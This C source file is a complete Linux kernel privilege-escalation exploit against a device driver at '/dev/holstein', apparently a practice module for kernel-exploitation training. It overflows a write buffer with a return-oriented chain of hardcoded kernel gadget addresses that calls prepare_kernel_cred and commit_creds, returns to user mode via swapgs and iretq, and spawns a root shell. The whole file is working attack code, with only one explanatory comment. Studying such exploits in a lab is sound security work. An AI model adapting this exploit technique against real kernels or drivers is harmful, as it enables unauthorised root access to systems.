#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>

#define DEVICE "/dev/holstein"
#define BUFFER_SIZE 0x400/0x8

// rep: This is a prefix that stands for "repeat." 
// It tells the CPU to repeat the following instruction 
// a number of times based on the value in the RCX register. 
// Specifically, it decrements RCX after each iteration until it reaches zero.
unsigned long mov_rdi_rax_rep = 0xffffffff8160c96b;
unsigned long pop_rdi = 0xffffffff8127bbdc;
unsigned long pop_rcx = 0xffffffff812ea083;
unsigned long swapgs = 0xffffffff8160bf7e;
unsigned long iretq = 0xffffffff810202af;
unsigned long prepare_kernel_cred = 0xffffffff8106e240;
unsigned long commit_creds = 0xffffffff8106e390;
long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;

void save_state() {
    asm volatile(
        ".intel_syntax noprefix;"
        "mov _proc_cs, cs;"
        "mov _proc_ss, ss;"
        "mov _proc_rsp, rsp;"
        "pushf;"
        "pop _proc_rflags;"
        ".att_syntax"
        );

    printf("[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n", _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}

void spawn_shell()
{
    puts("[+] Hello Userland!");

    puts("[*] starting shell");
    system("/bin/sh");

    puts("[*] quitting exploit");
    exit(0); // avoid ugly segfault
}

int main(int argc, char *argv[]){
    setvbuf(stdout, NULL, _IONBF, 0);
    save_state();
    
    int fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        perror("[-] open");
        exit(1);
    }
    printf("[+] device opened at: %d\n", fd);

    unsigned long payload[BUFFER_SIZE+0x20] = {0x0};
    unsigned long* chain = &payload[BUFFER_SIZE+0x1];
    *chain++ = pop_rdi;
    *chain++ = 0x0;
    *chain++ = prepare_kernel_cred;
    *chain++ = pop_rcx;
    *chain++ = 0x0;
    *chain++ = mov_rdi_rax_rep;
    *chain++ = commit_creds;
    *chain++ = swapgs;
    *chain++ = iretq;
    *chain++ = (unsigned long) &spawn_shell;
    *chain++ = _proc_cs;
    *chain++ = _proc_rflags;
    *chain++ = _proc_rsp;
    *chain++ = _proc_ss;

    if (write(fd, payload, sizeof(payload))) {
        perror("[-] write");
        exit(1);
    }

    printf("[*] ...\n");
    getchar();   
}